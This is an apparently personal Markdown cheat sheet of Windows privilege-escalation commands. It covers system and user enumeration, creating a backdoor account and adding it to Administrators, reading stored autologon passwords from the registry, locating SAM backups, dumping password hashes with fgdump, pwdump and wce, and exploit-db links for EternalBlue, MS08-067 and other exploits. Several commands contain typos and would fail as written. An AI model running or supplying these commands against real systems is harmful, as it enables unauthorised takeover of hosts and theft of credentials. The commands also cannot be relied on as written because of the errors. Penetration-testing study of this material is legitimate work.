# Privesc in windows
## Finding operating system info
```
ver
c:\windows\system32\license.rtf
c:\windows\system32\licenses\*
c:\windows\system32\eula..txt
systeminfo | findstr /B /C "OS Name" /C: "OS Version"
```
## important not to put spaces there
```
wmic os get Caption,Version /value
```


## find user info
```
whoami 
echo %username%
net user 
net user someusername
net user username /domain
echo %userprofile%
```

## This wil lalso tell you hostname, domain, software version (generic) and MAC address of NIC
```
net config workstation | find "user name"
```

## shows who's logged in
```
query user
wmic useraccount get name
wmic /node: "127.0.0.1" computersystem get username
qwinsta
cmdkey /list
```

## check installed programs,perms,and hidden files
```
dir /q
dir /r 
attrib -h *.*
wmic /node: "127.0.0.1" product get name,version
```

## shows all kinds of goodies about installed warez
```
wmic product get /format:lisit
```



## manual escalations
```
net user username password /add
net localgroup Administrators username /add
net localgroup "Remote Desktop Users" username /add
psexec.exe -accepteula \\hostname -u hostnanme\username -p password cmd /c net user username password /add
runas /user:hostname\username powershell.exe
reg.exe save
icacls
```

## not on win7
```
reg query "HKLM\Software\Microsoft\WindowsNT\CurrentnVersion\WinLogon" /v DefaultUserName
reg query "HKLM\Software\Microsoft\WindowsNT\CurrentnVersion\WinLogon" /v DefaultPassword
```

## sam fiile locations
```
c:\Windows\System32\Config\RegBack\sam.old
c:\Windows\System32\Config\RegBack\system.old
```

## running services
```
sc query type=service
sc qc servicenamehere
Get-SErvice -DisplayName "Service"
Get-CimInstance Win32_Service -filter "Name='Service'" | Format-list -Property *
```

## checked scheduled tasks /jobs
```
schtasks /query /v /fo LIST
Get-ScheduledTask | where state -eq 'Ready'
```

## MOST COMMON WINDOWS SPLOITS
```
7, 8.1, 2008 R2, 2012 R2, 2016 R2 SMB w/o firewall: Eternalblue (MS17-010): https://www.exploit-db.com/docs/english/42280-how-to-exploit-eternalblue-on-windows-server-2012-r2.pdf
XP MS08-067: 40279 : https://www.exploit-db.com/exploits/40279/
Hashing: FGdump/PWdump (Workgroup) or WCE32/64 (Domain) wce32.exe -w, password returned
XP Pro SP3, 2003 SP2 (use with GUI) - MS11-080: https://www.exploit-db.com/exploits/18176/
Novell Client 2 SP3 on Windows 7 and 8: https://www.exploit-db.com/exploits/27191/
Weak services IIS exploit: churrasco - https://www.exploit-db.com/exploits/6705/
    Usage: churrasco.exe -d cmd.exe
Win7 x86 32bit: GDI Objects - MS17-017 - https://www.exploit-db.com/exploits/42432/
Powerup: https://raw.githubusercontent.com/HarmJ0y/PowerUp/master/PowerUp.ps1
```
